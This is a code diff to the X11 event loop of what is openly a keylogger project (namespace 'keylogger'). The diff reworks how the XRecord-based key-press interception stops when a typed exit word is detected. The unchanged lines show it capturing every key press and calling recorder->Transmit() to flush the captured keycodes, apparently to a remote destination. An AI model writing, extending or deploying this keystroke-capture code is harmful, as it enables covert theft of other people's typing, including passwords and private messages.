@@ -1,6 +1,5 @@
 #include "recorder/event_loop.h"
 
-#include <atomic>
 #include <cctype>
 #include <cstring>
 #include <stdexcept>
@@ -24,10 +23,9 @@ static void UpdateHistoryStr(char c, std::string& history) {
 #include <X11/Xutil.h>
 #include <X11/extensions/record.h>
 
-static std::atomic_bool exit_event_loop(false);
-
 struct CallbackData {
   ::Display* ctrl_disp = nullptr;
+  ::XRecordContext* ctx = nullptr;
   keylogger::Recorder* recorder = nullptr;
 };
 
@@ -92,7 +90,7 @@ void KeyCallback(XPointer closure, XRecordInterceptData* hook) {
         UpdateHistoryStr(character, history);
         if (history == kExitWord) {
           /* The exit word was typed, terminate the event loop. */
-          exit_event_loop = true;
+          ::XRecordDisableContext(cb_data->ctrl_disp, *cb_data->ctx);
         }
       }
       break;
@@ -135,21 +133,19 @@ void keylogger::RecordKeyPressEvents(keylogger::Recorder* recorder) {
 
   CallbackData cb_data{
       .ctrl_disp = ctrl_disp,
+      .ctx = &record_ctx,
       .recorder = recorder,
   };
-  if (!::XRecordEnableContextAsync(data_disp, record_ctx, KeyCallback,
-                                   reinterpret_cast<::XPointer>(&cb_data))) {
+  if (!::XRecordEnableContext(data_disp, record_ctx, KeyCallback,
+                              reinterpret_cast<::XPointer>(&cb_data))) {
     throw std::runtime_error("could not enable record context");
   }
 
-  while (!exit_event_loop) {
-    ::XRecordProcessReplies(data_disp);
-  }
+  ::XRecordProcessReplies(data_disp);
 
   /* Flush any remaining keycodes in the recorder. */
   recorder->Transmit();
 
-  ::XRecordDisableContext(ctrl_disp, record_ctx);
   ::XRecordFreeContext(ctrl_disp, record_ctx);
   ::XFree(record_rng);
   ::XCloseDisplay(data_disp);
@@ -161,6 +157,7 @@ void keylogger::RecordKeyPressEvents(keylogger::Recorder* recorder) {
 #include <conio.h>
 #include <windows.h>
 
+#include <atomic>
 #include <condition_variable>
 #include <cstdint>
 #include <mutex>
